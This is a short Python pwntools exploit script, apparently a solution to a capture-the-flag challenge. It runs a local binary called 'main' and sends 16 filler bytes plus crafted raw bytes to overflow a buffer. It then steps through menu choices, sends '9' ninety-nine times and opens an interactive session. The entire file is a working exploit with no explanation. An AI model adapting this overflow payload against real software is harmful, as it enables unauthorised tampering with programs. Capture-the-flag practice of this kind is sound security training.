from pwn import *

if __name__ == "__main__":
    p = process("./main")
    print p.recvuntil(">")
    p.sendline(("A" * 16) + ("\xff\xff\xff\x0f\x01"))
    print p.recvuntil(">")
    p.sendline("y")
    print p.recvuntil(">")
    p.sendline("2")
    print p.recvuntil(">")
    p.sendline("4")
    print p.recvuntil(">")
    p.sendline("y")
    for i in xrange(99):
        print p.recvuntil(">")
        p.sendline("9")
    p.interactive()
